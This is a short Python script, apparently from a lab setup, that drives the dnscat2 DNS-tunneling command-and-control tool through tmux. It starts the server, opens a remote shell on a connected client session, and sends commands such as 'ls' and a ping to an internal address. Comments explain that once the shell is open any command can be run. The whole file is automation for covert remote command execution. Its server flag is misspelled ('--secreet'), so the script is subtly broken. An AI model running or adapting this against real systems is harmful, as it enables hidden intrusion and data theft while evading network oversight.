import subprocess
import os 
import time

os.chdir("/home/ssh_user/dns/server")
# subprocess("cd /home/ssh_user/dns/server", shell=True)
session_name = "dns_session_server"
subprocess.run(f"tmux new-session -A -s {session_name}", shell=True)
cmd= "ruby dnscat2.rb --secreet=abc"
time.sleep(4)
subprocess.run(f'tmux send-keys -t {session_name}.0 "{cmd}" Enter', shell=True)
cmd="session -i 1"
time.sleep(4)

subprocess.run(f'tmux send-keys -t {session_name}.0 "{cmd}" Enter', shell=True)
cmd = "shell"
subprocess.run(f'tmux send-keys -t {session_name}.0 "{cmd}" Enter', shell=True)
cmd = "session -i 2"
time.sleep(4)

subprocess.run(f'tmux send-keys -t {session_name}.0 "{cmd}" Enter', shell=True)
cmd = "ls"
subprocess.run(f'tmux send-keys -t {session_name}.0 "{cmd}" Enter', shell=True)
cmd = "ping 172.20.0.3"
subprocess.run(f'tmux send-keys -t {session_name}.0 "{cmd}" Enter', shell=True)
print("tmux commands run")

# for cmd in commands:
#     print("Executing command:", cmd)
#     try:
#         subprocess.run(f'tmux send-keys -t {session_name}.0 "{cmd}" Enter', shell=True, check=True)
#         print("Command executed successfully")
#     except subprocess.CalledProcessError as e:
#         print("Command failed with error:", e)

# dns tunneling: initiate client & server listner in tmux session
# dns server first: 
# ruby dnscat2.rb --secret=abc
# enter session server: session -i 1
# shell
# session -i 2
#  NOW ANY COMMANDS CAN BE RUN - (except possibly ssh- no psudo terminal)
# ping 172.20.0.2